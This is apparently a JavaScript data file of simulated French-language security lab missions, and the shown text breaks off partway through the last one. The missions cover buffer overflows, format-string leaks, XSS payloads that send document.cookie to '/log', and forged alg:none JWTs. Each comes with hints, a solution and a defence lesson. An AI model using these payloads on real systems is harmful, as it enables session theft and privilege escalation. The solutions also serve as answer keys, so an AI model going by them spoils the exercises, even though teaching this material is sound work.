/* =========================================================================
 *  42 ORIGINS — labos Cybersécurité chapitres 6-10 (ords 1-9)
 *  Tout est SIMULÉ et pédagogique. engine_cyber.js est la référence.
 *  But : comprendre une faille pour la DÉFENDRE (🛡 dans chaque leçon).
 * ========================================================================= */
(function (root) {
  'use strict';
  var O42 = root.O42 = root.O42 || {};
  O42.missions = O42.missions || {};
  O42.missions.cyber = O42.missions.cyber || [];
  O42.missions.cyber.push(

    /* ===================================================================
     *  CHAPITRE 6 — Mémoire (débordement de tampon + chaîne de format)
     * =================================================================== */
    {
      id: 'cyb6_1', ch: 6, ord: 1, title: 'Un octet de trop', job: 'Chapitre 6 · Mémoire', stars: 3, scene: 'terminal',
      cyber: { sim: 'overflow', buf: 8, afterLen: 1, afterInit: 0, varName: 'pseudo[8]', afterName: 'is_admin', winMsg: 'is_admin ≠ 0 → tu passes administrateur !', flag: 'flag{off_by_one}', success: function (after) { return after !== 0; } },
      story: 'Un vieux jeu du campus lit ton pseudo avec <code>gets()</code> dans un tampon de 8 octets. Juste derrière, en mémoire, se trouve <code>is_admin</code>.',
      goal: 'Tape une entrée assez longue pour <b>déborder</b> le tampon de 8 octets et écrire dans <code>is_admin</code> (qui vaut 0). Regarde la mémoire à droite case par case.',
      lesson: '<pre>char pseudo[8];\nchar is_admin = 0;   // juste après pseudo\ngets(pseudo);         // ne vérifie PAS la taille</pre>' +
        '<p><code>gets</code> copie tout ce que tu tapes. Au 9ᵉ caractère, l’octet déborde sur <code>is_admin</code>.</p>' +
        '<p>Il faut 8 caractères pour remplir le tampon, puis 1 de plus pour toucher la variable voisine.</p>' +
        '<p>🛡 Défense : <code>fgets(buf, sizeof buf, stdin)</code> avec une taille, jamais <code>gets</code>.</p>',
      starter: 'moi\n',
      hints: ['Le tampon fait 8 octets : combien de caractères pour arriver juste après ?', 'Tape 8 caractères, puis au moins 1 de plus (9 au total).', 'AAAAAAAAA'],
      solution: 'AAAAAAAAA\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb6_2', ch: 6, ord: 2, title: 'Le badge trafiqué', job: 'Chapitre 6 · Mémoire', stars: 3, scene: 'terminal',
      cyber: { sim: 'overflow', buf: 16, afterLen: 1, afterInit: 0, varName: 'nom[16]', afterName: 'niveau', winMsg: 'niveau ≠ 0 → accès réservé débloqué !', flag: 'flag{seize_plus_un}', success: function (after) { return after !== 0; } },
      story: 'Le lecteur de badges copie le nom gravé (16 octets) dans un tampon, suivi du <code>niveau</code> d’accès.',
      goal: 'Déborde le tampon de 16 octets pour mettre <code>niveau</code> à autre chose que 0.',
      lesson: '<p>Même faille, tampon plus grand : <code>char nom[16];</code> puis <code>char niveau = 0;</code>.</p>' +
        '<p>Compte : 16 octets pour remplir le tampon, puis 1 octet qui déborde sur <code>niveau</code>.</p>' +
        '<p>🛡 Défense : limiter la lecture à la taille exacte du tampon.</p>',
      starter: 'badge\n',
      hints: ['16 octets à remplir avant d’atteindre le voisin.', 'Écris 17 caractères.', 'AAAAAAAAAAAAAAAAB'],
      solution: 'AAAAAAAAAAAAAAAAB\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb6_3', ch: 6, ord: 3, title: 'Déborder sur un entier', job: 'Chapitre 6 · Mémoire', stars: 3, scene: 'terminal',
      cyber: { sim: 'overflow', buf: 8, afterLen: 4, afterInit: 0, varName: 'buf[8]', afterName: 'droits (int)', winMsg: 'droits ≠ 0 → privilèges accordés !', flag: 'flag{int_voisin}', success: function (after) { return after !== 0; } },
      story: 'Cette fois la variable voisine est un <code>int</code> de 4 octets : <code>droits</code>, à 0.',
      goal: 'Déborde le tampon de 8 octets pour écrire dans l’entier <code>droits</code>. Un seul octet qui déborde suffit à le rendre non nul.',
      lesson: '<p>Un <code>int</code> occupe 4 octets en mémoire. Si tu écris ne serait-ce qu’un octet juste après le tampon, la valeur de l’entier change.</p>' +
        '<p>8 caractères remplissent le tampon ; le 9ᵉ tombe sur le premier octet de <code>droits</code>.</p>' +
        '<p>🛡 Défense : vérifier les bornes avant toute copie ; compiler avec protections (stack canary, FORTIFY).</p>',
      starter: 'alice\n',
      hints: ['L’entier fait 4 octets mais il suffit d’en changer un.', 'Écris 9 caractères : 8 pour le tampon, 1 qui déborde.', 'AAAAAAAAX'],
      solution: 'AAAAAAAAX\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb6_4', ch: 6, ord: 4, title: 'Écrire la bonne valeur', job: 'Chapitre 6 · Mémoire', stars: 4, scene: 'terminal',
      cyber: { sim: 'overflow', buf: 20, afterLen: 4, afterInit: 0, varName: 'commentaire[20]', afterName: 'magic (int)', winMsg: 'magic == 0x42424242 → coffre ouvert !', flag: 'flag{valeur_controlee}', success: function (after) { return after === 0x42424242; } },
      story: 'Le coffre ne s’ouvre que si l’entier voisin <code>magic</code> vaut exactement <code>0x42424242</code>. Or <code>0x42</code> est le code du caractère « B ».',
      goal: 'Remplis le tampon de 20 octets, puis écris 4 octets qui donnent <code>0x42424242</code> dans <code>magic</code>. Indice : un octet <code>0x42</code> s’écrit « B ».',
      lesson: '<p>Un débordement ne sert pas qu’à « mettre non nul » : tu <b>contrôles</b> les octets écrits. En choisissant les bons caractères, tu poses la valeur exacte voulue dans la variable voisine.</p>' +
        '<p>Chaque « B » = octet <code>0x42</code>. Quatre « B » après les 20 octets de remplissage donnent <code>0x42424242</code>.</p>' +
        '<p>🛡 Défense : ne jamais laisser l’entrée écrire au-delà du tampon ; un canari détecte l’écrasement.</p>',
      starter: 'ok\n',
      hints: ['20 octets de remplissage, puis la valeur voulue.', 'Le caractère « B » vaut 0x42 ; il en faut 4 pour 0x42424242.', 'AAAAAAAAAAAAAAAAAAAABBBB'],
      solution: 'AAAAAAAAAAAAAAAAAAAABBBB\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb6_5', ch: 6, ord: 5, title: 'Le drapeau déjà posé', job: 'Chapitre 6 · Mémoire', stars: 4, scene: 'terminal',
      cyber: { sim: 'overflow', buf: 32, afterLen: 1, afterInit: 255, varName: 'message[32]', afterName: 'licence', winMsg: 'licence modifiée → version « pro » activée !', flag: 'flag{ecraser_le_voisin}', success: function (after) { return after !== 0 && after !== 255; } },
      story: 'Ici la variable voisine n’est pas à 0 : <code>licence</code> vaut déjà 255 (version d’essai). Débordes-la pour poser une AUTRE valeur.',
      goal: 'Déborde le tampon de 32 octets pour que <code>licence</code> ne vaille plus ni 0 ni 255.',
      lesson: '<p>Un débordement peut écraser une variable même si elle était déjà initialisée : les octets de ton entrée remplacent purement et simplement les siens.</p>' +
        '<p>32 octets remplissent le tampon ; le 33ᵉ remplace l’octet de <code>licence</code> (255) par le code du caractère que tu tapes.</p>' +
        '<p>🛡 Défense : séparer données et contrôle ; valider la taille des entrées à la source.</p>',
      starter: 'root\n',
      hints: ['Le tampon fait 32 octets.', 'Écris 33 caractères : le dernier remplace la valeur 255.', 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ'],
      solution: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb6_6', ch: 6, ord: 6, title: 'printf trop bavard', job: 'Chapitre 6 · Mémoire', stars: 4, scene: 'terminal',
      cyber: { sim: 'formatstr', secret: 'flag{format_un_x}', stack: ['SECRET=flag{format_un_x}', '0x00000000', '0x00000000'], flag: 'flag{format_un_x}' },
      story: 'Un programme affiche ton message avec <code>printf(message)</code> au lieu de <code>printf("%s", message)</code>. Erreur classique de chaîne de format.',
      goal: 'Utilise un spécificateur <code>%x</code> pour faire <b>fuiter</b> une valeur de la pile. Le secret est posé tout en haut de la pile.',
      lesson: '<p>Quand <code>printf</code> reçoit ta chaîne comme format, chaque <code>%x</code> lit un mot de la pile et l’affiche — même si aucun argument n’a été passé.</p>' +
        '<p>Le secret est la première valeur lue : un seul <code>%x</code> le fait apparaître.</p>' +
        '<p>🛡 Défense : toujours un format constant — <code>printf("%s", message)</code>, jamais <code>printf(message)</code>.</p>',
      starter: 'bonjour\n',
      hints: ['Écris un spécificateur de format au lieu d’un texte normal.', 'Un seul %x lit la première valeur de la pile.', '%x'],
      solution: '%x\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb6_7', ch: 6, ord: 7, title: 'Plus loin dans la pile', job: 'Chapitre 6 · Mémoire', stars: 4, scene: 'terminal',
      cyber: { sim: 'formatstr', secret: 'flag{troisieme_mot}', stack: ['0x7ffd1a40', '0x00401b60', 'SECRET=flag{troisieme_mot}', '0x00000000'], flag: 'flag{troisieme_mot}' },
      story: 'Même faille, mais le secret n’est plus en tête : il est à la 3ᵉ position de la pile.',
      goal: 'Enchaîne plusieurs <code>%x</code> pour lire jusqu’au 3ᵉ mot de la pile, où se cache le secret.',
      lesson: '<p>Chaque <code>%x</code> avance d’un cran dans la pile. Pour atteindre la 3ᵉ valeur, il en faut trois à la suite.</p>' +
        '<pre>%x.%x.%x</pre>' +
        '<p>🛡 Défense : format constant ; compiler avec <code>-Wformat -Wformat-security</code>.</p>',
      starter: '%x.%x\n',
      hints: ['Chaque %x lit un mot de plus.', 'Il faut atteindre la 3ᵉ valeur : trois %x.', '%x.%x.%x'],
      solution: '%x.%x.%x\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb6_8', ch: 6, ord: 8, title: 'Compter les crans', job: 'Chapitre 6 · Mémoire', stars: 5, scene: 'terminal',
      cyber: { sim: 'formatstr', secret: 'flag{sixieme_position}', stack: ['0x1', '0x2', '0x3', '0x4', '0x5', 'SECRET=flag{sixieme_position}', '0x0'], flag: 'flag{sixieme_position}' },
      story: 'Le secret est maintenant à la 6ᵉ position. Tu dois compter précisément combien de <code>%x</code> poser.',
      goal: 'Lis la 6ᵉ valeur de la pile avec six spécificateurs. Tu peux utiliser <code>%x</code> ou <code>%s</code>.',
      lesson: '<p>En pratique on augmente le nombre de <code>%x</code> jusqu’à voir apparaître des octets lisibles (du texte au lieu de nombres).</p>' +
        '<p>Ici la cible est à la 6ᵉ place : six spécificateurs à la suite.</p>' +
        '<p>🛡 Défense : ne jamais construire un format à partir d’une entrée utilisateur.</p>',
      starter: '%x %x %x\n',
      hints: ['Compte les positions affichées à droite.', 'Le secret est le 6ᵉ : il faut six %x.', '%x %x %x %x %x %x'],
      solution: '%x %x %x %x %x %x\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb6_9', ch: 6, ord: 9, title: 'Tout au fond', job: 'Chapitre 6 · Mémoire', stars: 5, scene: 'terminal',
      cyber: { sim: 'formatstr', secret: 'flag{neuf_crans_profond}', stack: ['0x0a', '0x0b', '0x0c', '0x0d', '0x0e', '0x0f', '0x10', '0x11', 'SECRET=flag{neuf_crans_profond}'], flag: 'flag{neuf_crans_profond}' },
      story: 'Dernier entraînement du chapitre : le secret est posé au 9ᵉ mot de la pile, bien profond.',
      goal: 'Descends jusqu’au 9ᵉ mot avec neuf spécificateurs de format pour faire fuiter le secret.',
      lesson: '<p>Un attaquant ne connaît pas toujours la profondeur : il envoie beaucoup de <code>%x</code> d’un coup et lit le vidage de pile. Ici, neuf suffisent.</p>' +
        '<p>Astuce de métier : <code>%p</code> affiche aussi un mot ; en vrai on utilise des accès indexés (<code>%7$x</code>) pour viser directement.</p>' +
        '<p>🛡 Défense : format constant, et neutraliser les chaînes de format par compilation.</p>',
      starter: '%x %x %x %x\n',
      hints: ['Envoie beaucoup de %x et compte.', 'La cible est au 9ᵉ cran : neuf spécificateurs.', '%x.%x.%x.%x.%x.%x.%x.%x.%x'],
      solution: '%x.%x.%x.%x.%x.%x.%x.%x.%x\n',
      tests: [{}], rules: {}
    },

    /* ===================================================================
     *  CHAPITRE 7 — Web côté client (XSS, cookies, DOM)
     * =================================================================== */
    {
      id: 'cyb7_1', ch: 7, ord: 1, title: 'Le commentaire exécutable', job: 'Chapitre 7 · Web côté client', stars: 3, scene: 'terminal',
      cyber: { sim: 'xss', template: '<div class="comment">{{input}}</div>', cookie: 'SESSION=flag{xss_balise_script}', flag: 'flag{xss_balise_script}' },
      story: 'Un mur de commentaires affiche ton texte tel quel, inséré avec <code>innerHTML</code>. Tu peux y glisser du HTML actif.',
      goal: 'Poste un commentaire contenant une balise <code>&lt;script&gt;</code> qui lit <code>document.cookie</code> et l’envoie ailleurs.',
      lesson: '<p>Le texte est inséré sans échappement : une balise <code>&lt;script&gt;</code> s’exécute alors dans le navigateur des autres visiteurs.</p>' +
        '<pre>&lt;script&gt;new Image().src=\'/log?c=\'+document.cookie&lt;/script&gt;</pre>' +
        '<p>🛡 Défense : afficher avec <code>textContent</code> (pas <code>innerHTML</code>), cookies <code>HttpOnly</code>, en-tête <code>Content-Security-Policy</code>.</p>',
      starter: 'Super article !\n',
      hints: ['Injecte une balise qui exécute du JavaScript.', 'Vise document.cookie pour voler la session.', "<script>new Image().src='/log?c='+document.cookie</script>"],
      solution: "<script>new Image().src='/log?c='+document.cookie</script>\n",
      tests: [{}], rules: {}
    },
    {
      id: 'cyb7_2', ch: 7, ord: 2, title: 'Casser un attribut', job: 'Chapitre 7 · Web côté client', stars: 3, scene: 'terminal',
      cyber: { sim: 'xss', template: '<img src="{{input}}">', cookie: 'SESSION=flag{xss_onerror}', flag: 'flag{xss_onerror}' },
      story: 'Ton entrée est placée dans l’attribut <code>src</code> d’une balise <code>&lt;img&gt;</code>. Pas de balise <code>&lt;script&gt;</code> possible… mais un attribut, oui.',
      goal: 'Sors de l’attribut <code>src</code> avec un guillemet, puis ajoute un <code>onerror</code> qui lit <code>document.cookie</code>.',
      lesson: '<p>Le gabarit est <code>&lt;img src="&lt;entrée&gt;"&gt;</code>. En commençant par <code>"</code> tu fermes l’attribut <code>src</code>, puis tu ajoutes ton propre attribut <code>onerror</code> (déclenché quand l’image ne charge pas).</p>' +
        '<pre>x" onerror="...document.cookie..."</pre>' +
        '<p>🛡 Défense : échapper les guillemets dans les attributs, n’afficher que des valeurs validées.</p>',
      starter: 'photo.jpg\n',
      hints: ['Ferme l’attribut src avec un guillemet double.', 'Ajoute onerror="..." pour exécuter du JS.', 'x" onerror="new Image().src=\'/log?c=\'+document.cookie'],
      solution: 'x" onerror="new Image().src=\'/log?c=\'+document.cookie\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb7_3', ch: 7, ord: 3, title: 'Sortir du commentaire HTML', job: 'Chapitre 7 · Web côté client', stars: 3, scene: 'terminal',
      cyber: { sim: 'xss', template: '<!-- {{input}} -->', cookie: 'SESSION=flag{xss_commentaire}', flag: 'flag{xss_commentaire}' },
      story: 'Ton message atterrit dans un commentaire HTML <code>&lt;!-- … --&gt;</code>. Les développeurs pensent que c’est inoffensif.',
      goal: 'Ferme le commentaire avec <code>--&gt;</code>, puis injecte un <code>&lt;script&gt;</code> qui vole le cookie.',
      lesson: '<p>Un commentaire se ferme par <code>--&gt;</code>. Tout ce qui suit redevient du HTML actif.</p>' +
        '<pre>--&gt;&lt;script&gt;fetch(\'/log?c=\'+document.cookie)&lt;/script&gt;&lt;!--</pre>' +
        '<p>🛡 Défense : ne jamais injecter de données brutes, même dans un commentaire ; échapper systématiquement.</p>',
      starter: 'note interne\n',
      hints: ['Un commentaire HTML se ferme par -->.', 'Après --> tu peux poser un <script>.', "--><script>fetch('/log?c='+document.cookie)</script><!--"],
      solution: "--><script>fetch('/log?c='+document.cookie)</script><!--\n",
      tests: [{}], rules: {}
    },
    {
      id: 'cyb7_4', ch: 7, ord: 4, title: 'Sortir d’une chaîne JS', job: 'Chapitre 7 · Web côté client', stars: 4, scene: 'terminal',
      cyber: { sim: 'xss', template: '<script>let user="{{input}}";</script>', cookie: 'SESSION=flag{xss_dans_js}', flag: 'flag{xss_dans_js}' },
      story: 'Ton pseudo est inséré au milieu d’un script, dans une chaîne JavaScript : <code>let user="&lt;entrée&gt;";</code>.',
      goal: 'Ferme la chaîne avec <code>"</code>, exécute ton code (vol du cookie) et neutralise la fin avec <code>//</code>.',
      lesson: '<p>Tu es déjà dans une balise <code>&lt;script&gt;</code> : inutile d’en ouvrir une. Il suffit de sortir de la chaîne de caractères.</p>' +
        '<pre>";new Image().src=\'/log?c=\'+document.cookie;//</pre>' +
        '<p>Le <code>//</code> met en commentaire le <code>";</code> restant pour que le script reste valide.</p>' +
        '<p>🛡 Défense : encoder les données injectées en contexte JavaScript (JSON.stringify côté serveur), CSP stricte.</p>',
      starter: 'bob\n',
      hints: ['Tu es déjà dans un <script> : sors juste de la chaîne "...".', 'Ferme avec ", exécute ton code, termine par //.', '";new Image().src=\'/log?c=\'+document.cookie;//'],
      solution: '";new Image().src=\'/log?c=\'+document.cookie;//\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb7_5', ch: 7, ord: 5, title: 'Le lien piégé', job: 'Chapitre 7 · Web côté client', stars: 4, scene: 'terminal',
      cyber: { sim: 'xss', template: '<a href="{{input}}">profil</a>', cookie: 'SESSION=flag{xss_onclick}', flag: 'flag{xss_onclick}' },
      story: 'Ton entrée remplit l’attribut <code>href</code> d’un lien. Tu peux lui coller un gestionnaire d’évènement.',
      goal: 'Ferme l’attribut <code>href</code> et ajoute un <code>onclick</code> (ou autre <code>on…</code>) qui lit <code>document.cookie</code>.',
      lesson: '<p>Comme pour l’image, un <code>"</code> ferme l’attribut et laisse place à un gestionnaire d’évènement que le navigateur exécutera.</p>' +
        '<pre>#" onclick="...document.cookie..."</pre>' +
        '<p>🛡 Défense : valider les URL (schéma autorisé), échapper les attributs, CSP.</p>',
      starter: '/accueil\n',
      hints: ['Ferme href avec un guillemet.', 'Ajoute onclick="..." avec document.cookie.', '#" onclick="new Image().src=\'/log?c=\'+document.cookie'],
      solution: '#" onclick="new Image().src=\'/log?c=\'+document.cookie\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb7_6', ch: 7, ord: 6, title: 'Guillemets simples', job: 'Chapitre 7 · Web côté client', stars: 4, scene: 'terminal',
      cyber: { sim: 'xss', template: "<input value='{{input}}'>", cookie: 'SESSION=flag{xss_onfocus}', flag: 'flag{xss_onfocus}' },
      story: 'Le champ est rempli avec <code>value=\'&lt;entrée&gt;\'</code> — entre guillemets <b>simples</b> cette fois.',
      goal: 'Ferme l’attribut avec une apostrophe <code>\'</code>, ajoute <code>autofocus</code> et un <code>onfocus</code> qui déclenche tout seul le vol du cookie.',
      lesson: '<p>Il faut fermer avec le bon type de guillemet : ici une apostrophe <code>\'</code>. L’attribut <code>autofocus</code> + <code>onfocus</code> s’exécute sans clic de la victime.</p>' +
        '<pre>x\' onfocus=\'...document.cookie...\' autofocus</pre>' +
        '<p>🛡 Défense : échappement contextuel (apostrophes incluses), CSP, cookies HttpOnly.</p>',
      starter: 'nom\n',
      hints: ["Ici le guillemet qui entoure la valeur est une apostrophe '.", 'Ferme avec \', puis onfocus + autofocus.', 'x\' onfocus=\'new Image().src="/log?c="+document.cookie\' autofocus'],
      solution: 'x\' onfocus=\'new Image().src="/log?c="+document.cookie\' autofocus\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb7_7', ch: 7, ord: 7, title: 'Attribut de données', job: 'Chapitre 7 · Web côté client', stars: 4, scene: 'terminal',
      cyber: { sim: 'xss', template: '<div data-x="{{input}}"></div>', cookie: 'SESSION=flag{xss_onmouseover}', flag: 'flag{xss_onmouseover}' },
      story: 'Ton entrée est stockée dans un attribut <code>data-x</code>. Un développeur pense qu’un attribut « de données » ne peut rien exécuter.',
      goal: 'Ferme l’attribut et ajoute un gestionnaire <code>onmouseover</code> qui vole le cookie au survol.',
      lesson: '<p>Peu importe le nom de l’attribut : dès que tu fermes le guillemet, tu peux ajouter n’importe quel gestionnaire <code>on…</code>.</p>' +
        '<pre>x" onmouseover="...document.cookie..."</pre>' +
        '<p>🛡 Défense : encoder la valeur dans l’attribut (HTML-encode des guillemets), ne jamais faire confiance au nom de l’attribut.</p>',
      starter: 'bonjour\n',
      hints: ['Ferme data-x avec un guillemet double.', 'Ajoute onmouseover="..." avec document.cookie.', 'x" onmouseover="new Image().src=\'/log?c=\'+document.cookie'],
      solution: 'x" onmouseover="new Image().src=\'/log?c=\'+document.cookie\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb7_8', ch: 7, ord: 8, title: 'Le mot « script » est filtré', job: 'Chapitre 7 · Web côté client', stars: 5, scene: 'terminal',
      cyber: { sim: 'xss', template: '<p>Résultat : {{input}}</p>', cookie: 'SESSION=flag{xss_sans_script}', flag: 'flag{xss_sans_script}' },
      story: 'Le site affiche ta recherche dans la page. L’équipe a « bloqué » la balise <code>&lt;script&gt;</code>… mais il existe d’autres façons d’exécuter du JS.',
      goal: 'Sans utiliser <code>&lt;script&gt;</code>, injecte une balise qui exécute du JavaScript (par exemple <code>&lt;svg onload&gt;</code>) et vole le cookie.',
      lesson: '<p>Bloquer un seul mot-clé ne suffit jamais. Une balise <code>&lt;svg&gt;</code> ou <code>&lt;img&gt;</code> avec un gestionnaire <code>on…</code> exécute du code sans le mot « script ».</p>' +
        '<pre>&lt;svg onload="...document.cookie..."&gt;&lt;/svg&gt;</pre>' +
        '<p>🛡 Défense : ne pas faire de liste noire de mots ; échapper toute donnée + CSP (qui bloque le JS en ligne).</p>',
      starter: 'rien trouvé\n',
      hints: ['Pas besoin de <script> : une balise avec un attribut onload suffit.', 'Essaie <svg onload="...">.', '<svg onload="new Image().src=\'/log?c=\'+document.cookie"></svg>'],
      solution: '<svg onload="new Image().src=\'/log?c=\'+document.cookie"></svg>\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb7_9', ch: 7, ord: 9, title: 'Sortir d’un objet JS', job: 'Chapitre 7 · Web côté client', stars: 5, scene: 'terminal',
      cyber: { sim: 'xss', template: '<script>const cfg={nom:"{{input}}"};</script>', cookie: 'SESSION=flag{xss_objet_js}', flag: 'flag{xss_objet_js}' },
      story: 'Dernier entraînement : ton entrée est injectée dans une chaîne, elle-même dans un objet JavaScript. Il faut sortir des deux.',
      goal: 'Ferme la chaîne puis l’objet (<code>"};</code>), exécute ton code de vol du cookie, et commente la fin avec <code>//</code>.',
      lesson: '<p>Contexte imbriqué : <code>const cfg={nom:"&lt;entrée&gt;"};</code>. Il faut fermer la chaîne (<code>"</code>) et l’accolade (<code>}</code>), finir l’instruction (<code>;</code>), lancer ton code, puis <code>//</code> pour neutraliser le reste.</p>' +
        '<pre>"};new Image().src=\'/log?c=\'+document.cookie;//</pre>' +
        '<p>🛡 Défense : encoder les données en contexte JS côté serveur, et surtout une CSP qui interdit le JavaScript en ligne.</p>',
      starter: 'Dana\n',
      hints: ['Tu es dans une chaîne, dans un objet, dans un <script>.', 'Ferme avec "}; exécute ton code, puis //.', '"};new Image().src=\'/log?c=\'+document.cookie;//'],
      solution: '"};new Image().src=\'/log?c=\'+document.cookie;//\n',
      tests: [{}], rules: {}
    },

    /* ===================================================================
     *  CHAPITRE 8 — Jetons & sessions (JWT alg:none, secrets faibles)
     * =================================================================== */
    {
      id: 'cyb8_1', ch: 8, ord: 1, title: 'Le jeton sans signature', job: 'Chapitre 8 · Jetons & sessions', stars: 4, scene: 'terminal',
      cyber: { sim: 'token', flag: 'JWT-NONE' },
      story: 'Après connexion, le site te donne un jeton JWT <code>header.payload.signature</code>. Par erreur, le serveur accepte les jetons dont le header dit <code>alg:none</code> (aucune signature vérifiée).',
      goal: 'Colle un jeton <b>alg:none</b> avec <code>{"role":"admin"}</code> dans le payload. Le header et le payload sont déjà encodés dans les indices.',
      lesson: '<p>Un JWT = <code>base64url(header).base64url(payload).signature</code>. Si le header dit <code>alg:none</code> et que le serveur l’accepte, la signature n’est pas vérifiée : le payload est falsifiable.</p>' +
        '<p><code>base64({"alg":"none"})</code> = <code>eyJhbGciOiJub25lIn0</code> ; <code>base64({"role":"admin"})</code> = <code>eyJyb2xlIjoiYWRtaW4ifQ</code>.</p>' +
        '<p>🛡 Défense : refuser <code>alg:none</code>, vérifier la signature avec un secret robuste, contrôler les droits côté serveur.</p>',
      starter: 'eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.abc\n',
      hints: ['Le header doit dire alg=none, le payload role=admin.', 'Colle header et payload en base64, séparés par un point, signature vide.', 'eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.'],
      solution: 'eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb8_2', ch: 8, ord: 2, title: 'Garder les autres champs', job: 'Chapitre 8 · Jetons & sessions', stars: 4, scene: 'terminal',
      cyber: { sim: 'token', flag: 'JWT-NONE' },
      story: 'Ton jeton contient <code>{"user":"bob","role":"user"}</code>. Tu veux passer admin sans perdre l’identité « bob ».',
      goal: 'Forge un jeton <b>alg:none</b> dont le payload est <code>{"user":"bob","role":"admin"}</code>.',
      lesson: '<p>Le payload n’est que du JSON encodé en base64 : tu peux changer <b>n’importe quel</b> champ, ici <code>role</code>, et garder les autres.</p>' +
        '<p><code>base64({"user":"bob","role":"admin"})</code> = <code>eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0</code>.</p>' +
        '<p>🛡 Défense : signer et vérifier le jeton, et surtout décider du rôle côté serveur, pas d’après le jeton.</p>',
      starter: 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ.\n',
      hints: ['Le starter est déjà alg:none mais role=user : change juste le rôle.', 'base64({"user":"bob","role":"admin"}) = eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0', 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0.'],
      solution: 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0.\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb8_3', ch: 8, ord: 3, title: 'Du HS256 au none', job: 'Chapitre 8 · Jetons & sessions', stars: 4, scene: 'terminal',
      cyber: { sim: 'token', flag: 'JWT-NONE' },
      story: 'Tu as un vrai jeton signé en <code>HS256</code> (role user). Tu ne connais pas le secret… mais tu peux changer l’algo en <code>none</code>.',
      goal: 'Remplace le header par <code>alg:none</code> ET mets <code>role:admin</code> dans le payload. Nouveau payload visé : <code>{"sub":"1007","role":"admin","iat":0}</code>.',
      lesson: '<p>Attaque « algorithm confusion » : on passe de <code>HS256</code> (signé) à <code>none</code> (non signé). Les deux parties se réécrivent en base64.</p>' +
        '<p><code>base64({"alg":"none"})</code> = <code>eyJhbGciOiJub25lIn0</code> ; <code>base64({"sub":"1007","role":"admin","iat":0})</code> = <code>eyJzdWIiOiIxMDA3Iiwicm9sZSI6ImFkbWluIiwiaWF0IjowfQ</code>.</p>' +
        '<p>🛡 Défense : fixer l’algorithme attendu côté serveur et refuser tout autre, <code>none</code> compris.</p>',
      starter: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ.ZmFrZXNpZw\n',
      hints: ['Réécris le header en alg:none (pas besoin du secret).', 'Mets role:admin dans le payload.', 'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMDA3Iiwicm9sZSI6ImFkbWluIiwiaWF0IjowfQ.'],
      solution: 'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMDA3Iiwicm9sZSI6ImFkbWluIiwiaWF0IjowfQ.\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb8_4', ch: 8, ord: 4, title: 'Jouer sur la casse', job: 'Chapitre 8 · Jetons & sessions', stars: 5, scene: 'terminal',
      cyber: { sim: 'token', flag: 'JWT-NONE' },
      story: 'Certains serveurs bloquent <code>"none"</code> mais oublient <code>"None"</code> ou <code>"NONE"</code> : la comparaison n’est pas insensible à la casse.',
      goal: 'Forge un jeton dont le header est <code>{"alg":"None"}</code> (N majuscule) et le payload <code>{"user":"carol","role":"admin"}</code>.',
      lesson: '<p>Un filtre naïf qui compare <code>alg === "none"</code> laisse passer <code>"None"</code>. Ici le serveur met la valeur en minuscules avant de comparer, donc <code>"None"</code> fonctionne comme <code>"none"</code>.</p>' +
        '<p><code>base64({"alg":"None"})</code> = <code>eyJhbGciOiJOb25lIn0</code>.</p>' +
        '<p>🛡 Défense : comparer en liste blanche d’algorithmes autorisés, jamais par liste noire sensible à la casse.</p>',
      starter: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ.ZmFrZXNpZw\n',
      hints: ['Essaie alg:None avec un N majuscule.', 'base64({"alg":"None"}) = eyJhbGciOiJOb25lIn0', 'eyJhbGciOiJOb25lIn0.eyJ1c2VyIjoiY2Fyb2wiLCJyb2xlIjoiYWRtaW4ifQ.'],
      solution: 'eyJhbGciOiJOb25lIn0.eyJ1c2VyIjoiY2Fyb2wiLCJyb2xlIjoiYWRtaW4ifQ.\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb8_5', ch: 8, ord: 5, title: 'Un payload bien rempli', job: 'Chapitre 8 · Jetons & sessions', stars: 5, scene: 'terminal',
      cyber: { sim: 'token', flag: 'JWT-NONE' },
      story: 'Le serveur attend un payload complet (sujet, nom, expiration). Tu le reconstruis entièrement avec le bon rôle.',
      goal: 'Forge un jeton <b>alg:none</b> avec le payload <code>{"sub":"u42","name":"Dana","role":"admin","exp":9999999999}</code>.',
      lesson: '<p>Rien ne t’empêche d’ajouter autant de champs que nécessaire : tant que la signature n’est pas vérifiée, tu décides du contenu.</p>' +
        '<p>Encode le JSON complet en base64url et colle-le après le header <code>none</code>.</p>' +
        '<p>🛡 Défense : vérifier la signature ET l’expiration côté serveur, refuser <code>none</code>.</p>',
